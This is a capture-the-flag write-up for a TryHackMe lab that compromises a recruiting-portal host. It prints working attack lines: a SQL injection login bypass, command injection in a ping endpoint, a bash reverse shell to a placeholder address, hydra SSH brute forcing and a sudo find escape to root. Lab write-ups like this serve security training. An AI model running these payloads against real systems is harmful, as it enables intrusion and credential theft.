<div style="display: flex; align-items: center; gap: 1rem;">
	<img src="https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1779217862269" alt="Silent Monitor" width="100" height="100">
	<h1>Operation Promotion — Write-up</h1>
</div>
<br>
**Platform:** TryHackMe  
**Room:** [Operation Promotion](https://tryhackme.com/room/operationpromotion)  
**Difficulty:** Easy  
**Category:** Linux  

## Scenario
You are up for promotion at Hadron Security. Your senior lead, Mara, has handed you a solo engagement against RecruitCorp, a small recruiting firm with a public-facing portal. Compromise the host, capture the flags, and demonstrate that you are ready for the Penetration Tester title.

## Reconnaissance
We start by enumerating the target using Nmap to identify open ports and services.
```bash
nmap -Pn -sT -n -T4 -p- -oN allports.txt operation-promotion.thm
```
```bash
nmap -sV -p 22,80,139,445 operation-promotion.thm
```

![Nmap Scan Results](https://i.postimg.cc/bwJF0FVr/Screenshot-From-2026-09-09-13-05-05.png)

As we can see, the target has the following ports open:
- **22/tcp** - SSH
- **80/tcp** - HTTP
- **139/tcp** - NetBIOS
- **445/tcp** - Microsoft-DS

## Enumerating the recruitment portal

First , we will check the web server on port 80 to see what we can find.

![Web Server](https://i.postimg.cc/SNVvMpdJ/Screenshot-From-2026-09-09-13-13-23.png)

We can see that the web server is running a recruitment portal. I check the source code of the page, but I don't find anything useful. Next, I will check the robots.txt file to see if there are any hidden directories.

![Robots.txt](https://i.postimg.cc/cH9v3Cv8/Screenshot-From-2026-09-09-13-19-36.png)

As we can see, the robots.txt file contains a disallowed directory: `/admin`. Let's check that out.

![Admin Page](https://i.postimg.cc/w3KT5mgX/Screenshot-From-2026-09-09-13-21-26.png)

## Access the admin panel

The `/admin` endpoint redirects me to a login page. I try the classic SQL injection payload `' OR '1'='1` in the username field, and it works! I am able to bypass the login and access the admin panel.

![Admin Panel](https://i.postimg.cc/QMPtNPwp/Screenshot-From-2026-09-09-13-24-59.png)

As we can see, the admin panel has a `User Lookup` feature, that allows us to see the details of a user by entering their ID. During my testing different IDs, I found a user with ID `7` that has the username `sysmaint`, with a note that says "Service account for /admin/sysmaint-checks/ping.php. Do not disable." This seems interesting, so I will check out the `/admin/sysmaint-checks/ping.php` endpoint.

![sysmaint-checks](https://i.postimg.cc/Y0G7jCKk/Screenshot-From-2026-09-09-14-16-54.png)

The endpoint `/admin/sysmaint-checks/ping.php` allows us to ping an IP address.

```
/admin/sysmaint-checks/ping.php?host=<target>
```
![endpoint](https://i.postimg.cc/2ybY3SRz/Screenshot-From-2026-09-09-14-23-38.png)

I will try to ping the localhost

![Ping Localhost](https://i.postimg.cc/WzW7Yshp/Screenshot-From-2026-09-09-14-31-28.png)

The ping command is executed on the server, and we can see that the output is displayed on the page. This means that we can execute arbitrary commands on the server by injecting them into the `host` parameter. I will try to execute the `id` command by using the command chaining technique.

```
/admin/sysmaint-checks/ping.php?host=127.0.0.1;id
```

![Command Injection](https://i.postimg.cc/SRhRMP4B/Screenshot-From-2026-09-09-14-41-05.png)

## Shell as www-data

So, we can now gain a reverse shell by using the command injection vulnerability. I will use the following command to get a reverse shell:

```
/admin/sysmaint-checks/ping.php?host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'
```

![Reverse Shell](https://i.postimg.cc/R0NPnsVF/Screenshot-From-2026-09-09-14-48-21.png)

And this it worked! I got a reverse shell on the target machine.

Moving around, I check the `config` folder and found a file called `db.conf`. This file contains the database credentials. According the credentials, and the `/etc/passwd`, we verify that the user `jford` exists on the system. and it's the target user.

![db.conf](https://i.postimg.cc/SKfKCrTF/Screenshot-From-2026-09-09-16-04-09.png)

## Shell as jford
Unfortunately, i cannot crack the **db_pass_hash**, so i get back to the index page and try find some clues that can help wit the password.

![index](https://i.postimg.cc/XqjBrvwN/Screenshot-From-2026-09-09-16-20-58.png)

I try to use the `spring2026` as the base for hashcat to automatically generate a wordlist, to brute force the password of the user `jford`. I use the following command to generate a wordlist using hashcat:
```bash
hashcat --stdout base -r /usr/share/hashcat/rules/dive.rule > wordlist.txt
```

Now, I will use the generated wordlist to brute force the password of the user `jford` using hydra.
```bash
hydra -l jford -P wordlist.txt operation-promotion.thm ssh
```

![hydra](https://i.postimg.cc/1XvnwZHz/Screenshot-From-2026-09-09-16-32-41.png)

We successfully get a hit! Now we are able to SSH into the target machine as the user `jford`.

![ssh](https://i.postimg.cc/XN1YfxWH/Screenshot-From-2026-09-09-16-36-54.png)

## Shell as root
Now that we are logged in as `jford`, we need to escalate our privileges to root. I check the classic `sudo -l` command to see if the user has any sudo privileges.

![sudo](https://i.postimg.cc/CLtCQjGh/Screenshot-From-2026-09-09-16-41-48.png)

I can see that the user can run the command `/usr/bin/find` as root without a password. used the following payload to escalate our privileges to root:
```bash
sudo find . -exec /bin/sh \; -quit
```

![find](https://i.postimg.cc/Kv4rf9M3/Screenshot-From-2026-09-09-16-45-23.png)

And we are root! Now we can read the root flag.

That's it! We have successfully pwned the target machine and captured both user and root flags. hope you enjoyed this write-up. If you have any questions or suggestions, feel free to reach out.